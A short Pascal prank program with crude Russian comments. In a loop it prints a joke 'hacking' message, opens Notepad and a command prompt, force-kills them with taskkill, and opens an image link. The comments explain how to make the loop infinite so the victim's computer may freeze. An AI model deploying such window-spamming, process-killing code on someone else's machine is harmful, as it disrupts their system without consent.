program hacking_ass; //название программы
  uses crt; //для открытии коммандной строки
  var
  Q:string;
  a:=1;              
begin
  while not keypressed do
  while a<=5 do //число вкладок открываемых в браузере (чем больше, вероятность что комп зависнет повышается)
begin
  writeln('Взлом сраки начался'); //вставляем любой текст
  a:=a+1; //0 - бесконечное открытие окон, 1 - сколько было задано в while a<=1 do
  Q:=('https://steamuserimages-a.akamaihd.net/ugc/925960612643321840/D18CD4FC8A345B20B731528AA347C2F1A80DC1AD/'); //ссылка на жопу
  exec ('C:/Windows/notepad.exe'); //запуск любой программы, выставляем путь который хотим
  exec ('C:/Windows/system32/cmd.exe'); //запуск любой программы, выставляем путь который хотим
  exec ('taskkill', '/f /im notepad.exe'); //"убивает" процесс программы которую мы выбрали выше
  exec ('taskkill', '/f /im cmd.exe'); //"убивает" процесс программы которую мы выбрали выше
  exec (Q);
  sleep(1*1000); //время спама, первое значение - открывает постепенно вкладки, второе - через сколько начнет открывать вкладки
end;
end.
//by Leshidzo 
//https://github.com/Leshidzo
//https://github.com/Leshidzo/You-Ass-Hacked